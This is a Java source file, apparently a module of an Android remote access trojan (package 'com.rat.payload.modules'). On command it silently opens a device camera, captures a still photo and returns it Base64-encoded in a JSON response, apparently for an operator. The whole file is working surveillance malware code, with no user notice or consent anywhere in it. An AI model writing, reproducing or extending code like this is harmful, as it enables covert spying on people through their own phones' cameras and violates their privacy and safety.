package com.rat.payload.modules;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.nio.ByteBuffer;
import java.util.Collections;

public class CameraModule implements CommandHandler.Command {

    private static final String TAG = "CameraModule";
    private Context context;

    public CameraModule(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public JSONObject execute(JSONObject args) {
        JSONObject result = new JSONObject();
        try {
            String cameraId = args.optString("camera", "0");
            CameraManager cm = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) {
                result.put("error", "CameraManager unavailable");
                return result;
            }
            HandlerThread thread = new HandlerThread("CameraThread");
            thread.start();
            Handler handler = new Handler(thread.getLooper());
            ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1);

            cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(reader.getSurface());
                        builder.set(CaptureRequest.JPEG_ORIENTATION, 90);
                        camera.createCaptureSession(Collections.singletonList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        session.capture(builder.build(), null, handler);
                                    } catch (Exception e) {
                                        Log.e(TAG, "capture error: " + e.getMessage());
                                    }
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {}
                            }, handler);
                    } catch (Exception e) {
                        Log.e(TAG, "session error: " + e.getMessage());
                    }
                }
                @Override
                public void onDisconnected(CameraDevice camera) { camera.close(); }
                @Override
                public void onError(CameraDevice camera, int error) { camera.close(); }
            }, handler);

            reader.setOnImageAvailableListener(reader1 -> {
                Image image = null;
                try {
                    image = reader1.acquireLatestImage();
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.capacity()];
                    buffer.get(bytes);
                    String b64 = Base64.encodeToString(bytes, Base64.DEFAULT);
                    result.put("image", b64);
                    result.put("camera", cameraId);
                } catch (Exception e) {
                    Log.e(TAG, "image error: " + e.getMessage());
                } finally {
                    if (image != null) image.close();
                }
            }, handler);

            Thread.sleep(3000);
            result.put("status", "captured");
        } catch (Exception e) {
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }
}
